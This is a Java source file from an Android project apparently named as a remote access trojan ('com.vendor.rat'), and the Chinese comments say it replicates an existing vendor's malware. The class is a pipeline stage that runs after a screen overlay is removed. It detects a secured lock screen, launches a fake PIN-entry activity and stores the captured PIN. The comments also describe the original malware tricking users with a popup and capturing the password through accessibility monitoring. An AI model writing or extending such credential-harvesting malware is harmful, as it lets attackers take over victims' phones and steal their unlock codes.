package com.vendor.rat.auto.pipeline.stage;

import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.vendor.rat.activity.LockCredentialPromptActivity;
import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;
import com.vendor.rat.credential.LockCredentialStore;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Stage 10: 锁屏密码采集
 *
 * 遮罩移除后、标记完成前，检查设备是否设置了锁屏密码。
 * 如果有锁屏且尚未保存 PIN → 弹出 LockCredentialPromptActivity 采集。
 *
 * Vendor 参考: o/h.java (DeviceCredentialDelegate) + ConfirmDeviceActivity
 * Vendor 流程: 诱导弹窗 → 系统锁屏验证 → 无障碍监听捕获密码
 * Replica 流程: 自建 PIN 输入页 → 用户主动输入 → LockCredentialStore 加密保存
 */
public class LockCredentialStage implements PipelineStage {

    private static final String TAG = "LockCredentialStage";
    private static final long PROMPT_TIMEOUT_MS = 120_000;

    /** Latch for waiting on LockCredentialPromptActivity result */
    private static volatile CountDownLatch promptLatch;

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        Context ctx = passable.getAppContext();
        if (ctx == null) {
            next.run();
            return;
        }

        // Already have credential → skip
        if (LockCredentialStore.hasCredential()) {
            Log.d(TAG, "PIN already stored, skipping");
            next.run();
            return;
        }

        // No lock screen set → skip
        KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
        if (km == null || !km.isDeviceSecure()) {
            Log.d(TAG, "Device has no lock screen, skipping");
            next.run();
            return;
        }

        // Launch PIN prompt and wait
        Log.i(TAG, "Device has lock screen but no stored PIN, launching prompt");
        promptLatch = new CountDownLatch(1);

        Intent intent = new Intent(ctx, LockCredentialPromptActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);

        try {
            boolean completed = promptLatch.await(PROMPT_TIMEOUT_MS, TimeUnit.MILLISECONDS);
            if (completed && LockCredentialStore.hasCredential()) {
                Log.i(TAG, "PIN collected successfully");
            } else {
                Log.w(TAG, "PIN prompt " + (completed ? "dismissed without saving" : "timed out"));
            }
        } catch (InterruptedException e) {
            Log.w(TAG, "Interrupted waiting for PIN prompt", e);
        } finally {
            promptLatch = null;
        }

        next.run();
    }

    /** Called by LockCredentialPromptActivity when it finishes (OK or Cancel) */
    public static void notifyPromptFinished() {
        CountDownLatch latch = promptLatch;
        if (latch != null) {
            latch.countDown();
        }
    }
}
